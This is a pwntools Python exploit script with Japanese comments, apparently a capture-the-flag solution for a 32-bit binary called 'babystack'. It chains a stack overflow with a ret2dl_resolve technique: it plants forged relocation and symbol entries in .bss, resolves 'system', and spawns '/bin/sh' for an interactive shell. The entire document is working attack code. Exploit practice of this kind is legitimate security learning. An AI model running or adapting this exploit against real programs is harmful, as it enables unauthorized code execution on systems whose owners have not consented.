#!/usr/bin/env python3
from pwn import *

target = process("./babystack")
elf = ELF("babystack")
gdb.attach(target, gdbscript="b *0x804843b")

#readealf -S から各セクションを読み込む
bss    = 0x804a020
dynstr = 0x804822c
dynsym = 0x80481cc
relplt = 0x80482b0

main        = 0x804843b
plt_resolve = 0x80482f0

log.info("最初のスキャン retによるread呼び出し時点でアドレスは解決している")
payload1 = b"0" * 44
payload1 += p32(elf.symbols["read"])
#read.pltはcallではなくjmpなのでスタックに帰るアドレスを入れておく必要がある
payload1 += p32(main)      
#readの引数 stdin bss(書き込み先) size(readで読み込ませるpayload2のサイズ)           
payload1 += p32(0)
payload1 += p32(bss)
payload1 += p32(43)                   

target.send(payload1)
log.info("first step done. Return main.")

"""
dynsymの各セクションは0x10バイト区切りなので0x10で割る
or 0x7(r_info下位ビット)は再配置タイプなので必要
bss + 0xcの位置にはdynstrのオフセット(今回はsystemへのオフセット)が格納されている
(要はdynstrのオフセットを格納する位置と考えりゃいい そもそもr_infoってそういうのだし)
"""
#0x10で割るとfloatになるのでint()してね 一応情報落ちしてないか見てね
dynsym_offset = int(( (bss + 0xc) - dynsym ) / 0x10)
r_info = (dynsym_offset << 8) | 0x7
print("r_info is ", hex(r_info))

#この位置にはlibc内関数のsystemのdynstrが格納されている
dynstr_index = (bss + 28) - dynstr

payload2 = b""

#なんでalarmなのかわからん
payload2 += p32(elf.got["alarm"])
payload2 += p32(r_info)

#padding
payload2 += p32(0x0)

payload2 += p32(dynstr_index)
payload2 += p32(0xde) * 3

payload2 += b"system\x00"

payload2 += b"/bin/sh\x00"

target.send(payload2)
log.info("second step done")

"""
mainの最初に飛んだあとに3回目のreadが実行される
ここでdl_resolveを仕込む
"""
binsh = bss + 35
rel_plt_offset = bss - relplt

payload3 = b""
payload3 += b"0" * 44
payload3 += p32(plt_resolve)
payload3 += p32(rel_plt_offset)
payload3 += p32(0xdeadbeaf)
payload3 += p32(binsh)

target.send(payload3)

target.interactive()
